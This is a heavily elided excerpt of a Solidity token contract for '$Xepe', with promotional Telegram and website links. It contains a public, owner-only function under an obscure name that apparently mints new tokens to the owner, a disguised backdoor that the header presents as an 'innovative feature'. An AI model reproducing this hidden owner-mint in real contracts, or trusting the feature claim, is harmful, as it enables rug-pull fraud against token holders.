//
// $Xepe proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/XepeBSC
// 📱 Website ::http://xepecoin.vip
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Xepe(uint256 amount) public onlyOwner {
 _Xepe(msg.sender, amount);
    }
    ...
    function _Xepe(address account, uint256 amount) internal virtual {
...
contract $Xepe is ERC20 {
    ...
    constructor() public ERC20("Xepe", "XEPE") {
     _Xepe(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}